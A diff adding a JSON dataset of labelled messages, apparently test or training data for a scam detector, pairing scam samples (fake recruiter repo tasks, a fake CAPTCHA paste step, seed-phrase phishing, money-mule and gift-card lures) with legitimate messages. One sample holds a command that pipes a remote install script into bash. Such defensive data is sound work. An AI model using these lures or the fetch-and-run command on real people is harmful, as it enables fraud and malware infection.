@@ -1,0 +1,402 @@
+[
+  {
+    "id": "scam-recruiter-repo",
+    "label": "scam",
+    "category": "malware-task",
+    "channel": "linkedin",
+    "title": "Recruiter: \"clone our repo\"",
+    "text": "Hi Elena,\n\nI came across your profile and I'm impressed by your Web3 experience. We're hiring a Senior Full-Stack Engineer at BlockForge Labs ($140-170k, fully remote).\n\nThe first step is a short technical assessment. Please clone our repo from bitbucket.org/blockforge-hr/dex-dashboard, run npm install and npm start, then fix the wallet balance bug. It should take about 45 minutes. Kindly finish it within 24 hours so we can schedule your interview with the CTO.\n\nBest regards,\nMarcus Hale\nTalent Partner"
+  },
+  {
+    "id": "scam-takehome-zip",
+    "label": "scam",
+    "category": "malware-task",
+    "channel": "email",
+    "title": "Take-home task in a ZIP",
+    "text": "Dear Candidate,\n\nThank you for applying for the Python Developer position. Attached is your test task (Assignment_Final.zip, password-protected, password: hire2026). Extract the archive and run setup.exe to install the environment, then open the project and complete task 3.\n\nPlease keep this assignment confidential.\n\nHR Department, Quantia Systems"
+  },
+  {
+    "id": "scam-clickfix-captcha",
+    "label": "scam",
+    "category": "malware-task",
+    "channel": "web",
+    "title": "Fake CAPTCHA: Win+R",
+    "text": "Verify you are human\n\nOur system detected unusual traffic. To continue, complete these steps:\n1. Press Win+R\n2. Press Ctrl+V to paste the verification command\n3. Press Enter\n\nVerification ID: 7731-CF. This check expires in 2 minutes."
+  },
+  {
+    "id": "scam-discord-npm",
+    "label": "scam",
+    "category": "malware-task",
+    "channel": "chat",
+    "title": "\"Test my game\" with npx",
+    "text": "hey bro, i saw your posts in the solidity channel. my team is launching a play-to-earn game and we pay testers 300 USDT per session. just run this in your terminal to start the beta client: curl -sL https://get.pixelwar-beta.xyz/install.sh | bash\nthen send me a screenshot. dont share the link pls, private beta"
+  },
+  {
+    "id": "scam-recruiter-telegram",
+    "label": "scam",
+    "category": "fake-recruiter",
+    "channel": "sms",
+    "title": "Part-time job, Telegram",
+    "text": "Hello! I am Linda from TalentHub Recruitment. Your resume has been selected for a part-time remote position. Earn $300 per day by rating hotels and products, 30-60 minutes daily, no experience needed. Daily pay! Please contact our HR manager on Telegram @talenthub_linda to start today."
+  },
+  {
+    "id": "scam-job-equipment",
+    "label": "scam",
+    "category": "fake-recruiter",
+    "channel": "email",
+    "title": "Job offer: buy equipment",
+    "text": "Congratulations! After reviewing your application you have been hired as a Remote Data Entry Clerk at Meridian Health ($38/hr). Interview was not necessary.\n\nWe will mail you a check of $4,850. Deposit it, keep $350 for yourself, and use the rest to purchase your work equipment from our approved vendor, which will be reimbursed. Send the vendor payment via Zelle or Bitcoin ATM today, as the equipment slots are limited.\n\nHR Onboarding Team"
+  },
+  {
+    "id": "scam-money-mule",
+    "label": "scam",
+    "category": "fake-recruiter",
+    "channel": "email",
+    "title": "\"Payment agent\" job",
+    "text": "Dear Applicant,\n\nOur company (Nordvik Trading Ltd) needs a local Payment Processing Agent. Your job is to receive payments from our clients into your personal bank account, keep 10% as your commission and forward the rest to our supplier in crypto. No experience required, 2 hours a week.\n\nReply with your full name, date of birth and bank account details to begin."
+  },
+  {
+    "id": "scam-seed-support",
+    "label": "scam",
+    "category": "wallet-drainer",
+    "channel": "chat",
+    "title": "\"Support\" wants seed phrase",
+    "text": "Hello, this is the official MetaMask support team. We noticed your wallet has been flagged for suspicious activity and will be locked. To restore access please enter your 12-word recovery phrase in the secure validation form: https://metamask-restore.app/sync . This must be done within 30 minutes."
+  },
+  {
+    "id": "scam-airdrop",
+    "label": "scam",
+    "category": "wallet-drainer",
+    "channel": "chat",
+    "title": "Airdrop: connect wallet",
+    "text": "🎉 You are eligible for the $ZKSYNC Season 2 airdrop! Allocation: 2,450 ZK (~$1,900). Connect your wallet at https://claim-zksync-airdrop.top and sign the message to claim your tokens. Unclaimed allocations are burned in 6 hours!"
+  },
+  {
+    "id": "scam-wallet-validation",
+    "label": "scam",
+    "category": "wallet-drainer",
+    "channel": "chat",
+    "title": "Discord \"mod\" wallet sync",
+    "text": "Hi, I'm a moderator of the OpenSea Discord. Your NFTs failed to sync after the migration. Our dev team can fix it with a quick wallet validation. Open the dApp below, choose \"Manual Sync\" and paste your private key or seed phrase to verify ownership: https://opensea-wallet-sync.xyz"
+  },
+  {
+    "id": "scam-ledger-letter",
+    "label": "scam",
+    "category": "wallet-drainer",
+    "channel": "email",
+    "title": "Ledger \"security upgrade\"",
+    "text": "Dear Ledger customer,\n\nDue to a recent security incident, all Ledger Nano devices must complete a mandatory firmware validation before 30 November. Devices that are not validated will be disabled and funds may be lost.\n\nGo to ledger-firmware-update.com, select your device and enter your 24-word recovery phrase to confirm ownership.\n\nLedger Security"
+  },
+  {
+    "id": "scam-lottery",
+    "label": "scam",
+    "category": "advance-fee",
+    "channel": "email",
+    "title": "Lottery win, pay a fee",
+    "text": "WINNING NOTIFICATION\n\nDear Winner, your email address has won the sum of $1,500,000.00 USD in the 2026 Global Online Lottery draw. To release your prize, pay the processing fee of $295 to our claims agent and send a copy of your passport. Keep this notification confidential until your claim is processed.\n\nDr. Paul Ekene, Claims Director"
+  },
+  {
+    "id": "scam-inheritance",
+    "label": "scam",
+    "category": "advance-fee",
+    "channel": "email",
+    "title": "Inheritance from a stranger",
+    "text": "Good day,\n\nI am Barrister James Okoro, the attorney to the late Engr. Daniel Weller who died with his family in a car accident. He left an unclaimed inheritance of $8.4 million in a bank here. As you share the same surname, I want to present you as the next of kin so the funds can be released to you. We will share 50/50. Please reply urgently with your phone number and home address and keep this strictly confidential."
+  },
+  {
+    "id": "scam-loan-fee",
+    "label": "scam",
+    "category": "advance-fee",
+    "channel": "sms",
+    "title": "Pre-approved loan fee",
+    "text": "QuickCredit: Congratulations, you have been pre-approved for a EUR 15,000 personal loan at 1.9%. To receive the money today, pay the refundable insurance fee of EUR 149 via the link: bit.ly/qc-loan-fee"
+  },
+  {
+    "id": "scam-bank-details",
+    "label": "scam",
+    "category": "fake-invoice",
+    "channel": "email",
+    "title": "Supplier: new bank account",
+    "text": "Hello Accounts team,\n\nPlease note that our bank details have changed due to an audit of our old account. Kindly pay the attached invoice INV-20931 (EUR 18,420.00) to the new account below and do not use the old account anymore:\n\nIBAN: LT12 1000 0111 0100 1000\nBIC: REVOLT21\n\nPlease process it today and confirm by email only, as I am travelling and cannot take calls.\n\nRegards,\nSofia Brandt\nFinance, Kestrel Components GmbH"
+  },
+  {
+    "id": "scam-overdue-invoice",
+    "label": "scam",
+    "category": "fake-invoice",
+    "channel": "email",
+    "title": "Overdue invoice + macros",
+    "text": "FINAL NOTICE: Your invoice #88412 is 14 days overdue. Legal action will be taken if payment is not received within 48 hours. Open the attached document Invoice_88412.doc and click Enable Content to view the amount and payment instructions.\n\nCollections Department"
+  },
+  {
+    "id": "scam-dhl-sms",
+    "label": "scam",
+    "category": "phishing",
+    "channel": "sms",
+    "title": "Parcel held: pay €1.99",
+    "text": "DHL: Your parcel is on hold due to an incomplete address. Pay the redelivery fee of EUR 1.99 within 24 hours to avoid return: https://dhl-parcel-help.top/eu"
+  },
+  {
+    "id": "scam-bank-sms",
+    "label": "scam",
+    "category": "phishing",
+    "channel": "sms",
+    "title": "Bank SMS: card blocked",
+    "text": "ALERT: Your Barclays card has been temporarily blocked due to unusual activity. Verify your card details now to restore access: http://barclays-secure-verify.com/restore"
+  },
+  {
+    "id": "scam-netflix",
+    "label": "scam",
+    "category": "phishing",
+    "channel": "email",
+    "title": "Netflix payment failed",
+    "text": "Dear Customer,\n\nWe were unable to process your last payment. Your Netflix membership will be suspended within 24 hours unless you update your billing information. Click the button below to update your payment details and keep watching.\n\n[Update payment] https://netfIix-billing-center.com/account\n\nThe Netflix Team"
+  },
+  {
+    "id": "scam-m365-password",
+    "label": "scam",
+    "category": "phishing",
+    "channel": "email",
+    "title": "Microsoft 365 password expiry",
+    "text": "Microsoft 365: The password for your mailbox expires today. To keep your current password, confirm your login details on the portal below. If no action is taken your mailbox will be deactivated and incoming emails deleted.\n\nKeep same password: https://login-rnicrosoftonline.com/keep\n\nIT Helpdesk"
+  },
+  {
+    "id": "scam-toll",
+    "label": "scam",
+    "category": "phishing",
+    "channel": "sms",
+    "title": "Unpaid toll",
+    "text": "E-ZPass: You have an unpaid toll balance of $6.85. To avoid a late fee of $50 and suspension of your vehicle registration, pay now at https://ezpass-tollpay.icu/pay"
+  },
+  {
+    "id": "scam-popup",
+    "label": "scam",
+    "category": "tech-support",
+    "channel": "web",
+    "title": "Virus pop-up, call now",
+    "text": "WINDOWS SECURITY ALERT\n\nYour computer has been infected with Trojan:Win32/Pornspy. Your files, passwords and banking data are at risk. Do not close this window or restart your PC.\n\nCall Microsoft Support immediately at +1 (888) 555-0193 (toll-free). A technician will help you remove the virus remotely."
+  },
+  {
+    "id": "scam-renewal",
+    "label": "scam",
+    "category": "tech-support",
+    "channel": "email",
+    "title": "\"Norton renewal\" refund",
+    "text": "Order confirmation #NX-449120\n\nThank you for renewing your Norton 360 Total Protection subscription. Your account was charged $399.99 today. If you did not authorize this renewal, call our refund department within 24 hours at +1 (844) 555-0178. Our technician will connect using AnyDesk to process your refund."
+  },
+  {
+    "id": "scam-wrong-number",
+    "label": "scam",
+    "category": "investment-romance",
+    "channel": "sms",
+    "title": "\"Wrong number\" opener",
+    "text": "Hi Jessica, is the dinner on Saturday still on? Oh sorry, wrong number! You seem nice though 😊 I'm Amy, I live in Singapore and work in wine import. My uncle is a crypto analyst and teaches me trading on a platform that gives about 8% weekly. Maybe we can be friends? Add me on WhatsApp, it's easier."
+  },
+  {
+    "id": "scam-trading-mentor",
+    "label": "scam",
+    "category": "investment-romance",
+    "channel": "chat",
+    "title": "Trading group: 3% daily",
+    "text": "Welcome to the VIP Quant Signals group! Our AI arbitrage bot delivers guaranteed returns of 3% daily with zero risk. Start with just $500 and double your money in 30 days. Deposit USDT (TRC20) to the address our assistant sends you, and keep this opportunity between us."
+  },
+  {
+    "id": "scam-recovery",
+    "label": "scam",
+    "category": "investment-romance",
+    "channel": "email",
+    "title": "Fund recovery service",
+    "text": "Have you lost money to a crypto scam? Our licensed fund recovery service can recover your lost crypto within 72 hours. We have already helped 3,200 victims. Pay the 10% upfront assessment fee in BTC and our blockchain forensics team will retrieve your stolen funds."
+  },
+  {
+    "id": "scam-marketplace-whatsapp",
+    "label": "scam",
+    "category": "off-platform-lure",
+    "channel": "chat",
+    "title": "Buyer: \"text me on WhatsApp\"",
+    "text": "Hello, is the bicycle still available? I will pay full price plus shipping, my courier will pick it up. I don't use this app much, please text me on WhatsApp +44 7700 900461 so I can send you the payment link from the delivery company."
+  },
+  {
+    "id": "scam-coinbase-lookalike",
+    "label": "scam",
+    "category": "lookalike-domain",
+    "channel": "email",
+    "title": "Coinbase look-alike link",
+    "text": "Coinbase Security\n\nA withdrawal of 0.4 BTC was requested from your account from a new device in Lagos. If this wasn't you, cancel the request now at https://coinbase.com.secure-cancel.net/case/55120 . Requests that are not cancelled are processed automatically in 15 minutes."
+  },
+  {
+    "id": "scam-ceo-giftcards",
+    "label": "scam",
+    "category": "other",
+    "channel": "email",
+    "title": "CEO wants gift cards",
+    "text": "Hi, are you at your desk? I need a quick favour. I'm stuck in a board meeting and can't talk. Please buy 6 Apple gift cards of $200 each for a client appreciation event, scratch the back and send me the codes by email. I'll reimburse you today. Don't tell anyone yet, it's a surprise.\n\nSent from my iPhone"
+  },
+  {
+    "id": "scam-irs-warrant",
+    "label": "scam",
+    "category": "other",
+    "channel": "call-script",
+    "title": "Tax office arrest threat",
+    "text": "This is an urgent message from the IRS tax enforcement division. An arrest warrant has been issued under your name for unpaid taxes of $4,780. To avoid arrest, you must pay the outstanding amount today with Google Play gift cards or a bitcoin ATM. Call back immediately at 202-555-0164."
+  },
+  {
+    "id": "legit-recruiter",
+    "label": "legit",
+    "category": "none",
+    "channel": "linkedin",
+    "title": "Real recruiter outreach",
+    "text": "Hi Daniel,\n\nI'm a technical recruiter at Northwind Labs. We're growing our payments infrastructure team in Berlin and your work on open-source Rust tooling caught my eye. The role is a Senior Backend Engineer (hybrid, €85-100k). You can read the full description on our careers page: https://careers.northwindlabs.com/jobs/4821\n\nWould you be open to a 20-minute intro call next week? If now isn't a good time, no worries at all.\n\nBest,\nPriya Raman\nTechnical Recruiter, Northwind Labs"
+  },
+  {
+    "id": "legit-invoice",
+    "label": "legit",
+    "category": "none",
+    "channel": "email",
+    "title": "Regular supplier invoice",
+    "text": "Hello,\n\nPlease find attached invoice INV-2026-0142 for the October hosting and support services (EUR 1,240.00, VAT included). Payment terms are 30 days, to the account already on file. If you have any questions about the line items, just reply to this email or call me on the usual number.\n\nThanks,\nMarta\nAccounts, Brightline Hosting"
+  },
+  {
+    "id": "legit-github",
+    "label": "legit",
+    "category": "none",
+    "channel": "email",
+    "title": "GitHub review request",
+    "text": "@kchen requested your review on acme/payments-api#311: \"Retry webhook delivery with exponential backoff\".\n\n3 files changed, 84 additions, 12 deletions.\n\nView it on GitHub: https://github.com/acme/payments-api/pull/311\n\nYou are receiving this because your review was requested. Reply to this email directly or unsubscribe."
+  },
+  {
+    "id": "legit-bank-signin",
+    "label": "legit",
+    "category": "none",
+    "channel": "email",
+    "title": "Bank: new sign-in notice",
+    "text": "We noticed a new sign-in to your online banking from Chrome on Windows on 26 November at 18:42.\n\nIf this was you, there is nothing you need to do. If you don't recognise it, open the bank app or call the number on the back of your card.\n\nWe will never ask for your password, PIN or one-time codes by email, text or phone."
+  },
+  {
+    "id": "legit-dhl-update",
+    "label": "legit",
+    "category": "none",
+    "channel": "email",
+    "title": "Real delivery update",
+    "text": "Your DHL shipment 4829 1137 26 is out for delivery today between 13:00 and 16:00. You can follow it or choose a different delivery day on https://www.dhl.com/tracking. No action is needed if someone will be at home."
+  },
+  {
+    "id": "legit-colleague-repo",
+    "label": "legit",
+    "category": "none",
+    "channel": "chat",
+    "title": "Colleague: review my repo",
+    "text": "Hey! When you get a minute, could you look at my branch feature/csv-export in our analytics repo? I changed the date parsing. If you want to try it locally, pull the branch and run npm test, the new cases are in parser.test.ts. No rush, tomorrow is fine."
+  },
+  {
+    "id": "legit-exchange-warning",
+    "label": "legit",
+    "category": "none",
+    "channel": "email",
+    "title": "Exchange security tips",
+    "text": "Security reminder from your exchange: our support team will never ask for your recovery phrase or private key, and we will never ask you to move funds to a \"safe\" wallet. Never share your seed phrase with anyone. Always check that you are on our official website before you sign in, and turn on two-factor authentication in Settings."
+  },
+  {
+    "id": "legit-interview-invite",
+    "label": "legit",
+    "category": "none",
+    "channel": "email",
+    "title": "Interview calendar invite",
+    "text": "Hi Alex,\n\nThanks for your application for the Product Designer role. We'd like to invite you to a 45-minute video interview with our design lead. Please pick a slot that suits you using our scheduling page: https://calendly.com/fernwood-studio/design-interview\n\nThe call will be on Google Meet. Feel free to bring a short portfolio walkthrough.\n\nKind regards,\nFernwood Studio People Team"
+  },
+  {
+    "id": "legit-takehome",
+    "label": "legit",
+    "category": "none",
+    "channel": "email",
+    "title": "Honest take-home task",
+    "text": "Hi Sam,\n\nAs discussed on the call, the next step is a small take-home exercise: build a REST endpoint that returns paginated search results, in any language you like. Please create it in your own GitHub repository and send us the link within a week; there is nothing for you to download or install from us. We'll discuss your solution in the final interview.\n\nCheers,\nTom, Engineering Manager"
+  },
+  {
+    "id": "legit-otp",
+    "label": "legit",
+    "category": "none",
+    "channel": "sms",
+    "title": "Verification code SMS",
+    "text": "Your Revolut verification code is 482913. Never share this code with anyone, including Revolut staff."
+  },
+  {
+    "id": "legit-utility-bill",
+    "label": "legit",
+    "category": "none",
+    "channel": "email",
+    "title": "Electricity bill ready",
+    "text": "Your November electricity bill is ready. Amount: EUR 74.30, due on 15 December. It will be collected by direct debit as usual, so you don't need to do anything. You can see the details in your account on our website or app."
+  },
+  {
+    "id": "legit-amazon-shipped",
+    "label": "legit",
+    "category": "none",
+    "channel": "email",
+    "title": "Order shipped",
+    "text": "Your Amazon order of \"USB-C Charging Cable (2-pack)\" has shipped and is arriving Friday. Track your package in Your Orders at https://www.amazon.de/gp/your-account/order-history"
+  },
+  {
+    "id": "legit-family",
+    "label": "legit",
+    "category": "none",
+    "channel": "sms",
+    "title": "Family text",
+    "text": "Hi love, can you grab milk and bread on your way home? Also grandma called, she wants to know if we're coming for lunch on Sunday. Call her back when you can."
+  },
+  {
+    "id": "legit-hiking-whatsapp",
+    "label": "legit",
+    "category": "none",
+    "channel": "chat",
+    "title": "Friend: WhatsApp group",
+    "text": "Hey, we're planning the Rila hike for Saturday, meeting at 7:30 at the bus station. Join us on WhatsApp, I made a group for the trip so we can sort out cars and food. Bring warm clothes, it's cold up there!"
+  },
+  {
+    "id": "legit-hackathon",
+    "label": "legit",
+    "category": "none",
+    "channel": "email",
+    "title": "Hackathon reminder",
+    "text": "Reminder: submissions for the Build with AI Hackathon close on 30 November at 14:00 PT. Make sure your project page includes a demo video, a link to your public repository and a short description. Winners will be announced on 15 December on our Devpost page. Good luck!"
+  },
+  {
+    "id": "legit-rent",
+    "label": "legit",
+    "category": "none",
+    "channel": "sms",
+    "title": "Landlord rent reminder",
+    "text": "Hi, just a friendly reminder that December rent is due on the 1st. Same account as always. Also the plumber will come on Tuesday morning to check the boiler, I hope that's OK. Thanks, Georgi"
+  },
+  {
+    "id": "legit-doctor",
+    "label": "legit",
+    "category": "none",
+    "channel": "sms",
+    "title": "Appointment reminder",
+    "text": "Reminder: your appointment with Dr. Ivanova at Sofia Family Clinic is on Thu 4 Dec at 10:15. Reply C to cancel or call the clinic to reschedule."
+  },
+  {
+    "id": "legit-oss-issue",
+    "label": "legit",
+    "category": "none",
+    "channel": "email",
+    "title": "Open-source bug report",
+    "text": "Thanks for the report! I can reproduce the crash on Node 22. To confirm the fix on your side, check out the fix/stream-close branch of the repository, run npm install && npm test, and let me know if the flaky test still fails. I'll publish a patch release once you confirm. — maintainer of csv-stream-lite"
+  },
+  {
+    "id": "legit-payslip",
+    "label": "legit",
+    "category": "none",
+    "channel": "email",
+    "title": "Payslip available",
+    "text": "Your payslip for November 2026 is now available in the HR portal. Log in with your usual company account to view or download it. If anything looks wrong, contact payroll through the HR helpdesk."
+  },
+  {
+    "id": "legit-crypto-sent",
+    "label": "legit",
+    "category": "none",
+    "channel": "email",
+    "title": "Exchange: you sent ETH",
+    "text": "You sent 0.05 ETH (EUR 146.20) to 0x52908400098527886E0F7030069857D2E4169EE7. The transaction was confirmed on the Ethereum network at 09:14. You can see the details under Activity in the app. If you don't recognise this transaction, contact support from the Help section of the app."
+  }
+]
